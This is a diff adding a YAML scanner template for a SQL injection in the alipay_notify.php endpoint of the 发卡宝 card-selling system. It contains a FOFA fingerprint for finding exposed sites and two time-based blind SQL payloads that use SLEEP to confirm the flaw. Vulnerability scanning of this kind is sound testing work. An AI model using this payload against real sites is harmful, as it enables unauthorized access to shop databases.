@@ -1,0 +1,30 @@
+id: poc-yaml-internet-fk-alipay-notify-sqli
+info:
+  name: 发卡宝卡密寄售系统 alipay_notify.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 发卡宝卡密寄售系统
+  fofa: template/t1/assets/js/odometer.min.js
+variables:
+  t1: random_int(6,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: POST
+  path: /shop/alipay_notify.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Upgrade-Insecure-Requests: 1
+  data: out_trade_no=' AND (SELECT 4286 FROM (SELECT(SLEEP({{.t1}})))ztQX)-- rLAn
+  expression: "status_code == 200 && \nbody == \"fail\" &&\nduration >= t1 &&\nduration\
+    \ <= t2\n"
+- method: POST
+  path: /shop/alipay_notify.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: out_trade_no=' AND (SELECT 4286 FROM (SELECT(SLEEP({{.t3}})))ztQX)-- rLAn
+  expression: "status_code == 200 && \nbody == \"fail\" &&\nduration >= t3 &&\nduration\
+    \ <= t4\n"
+transport: http
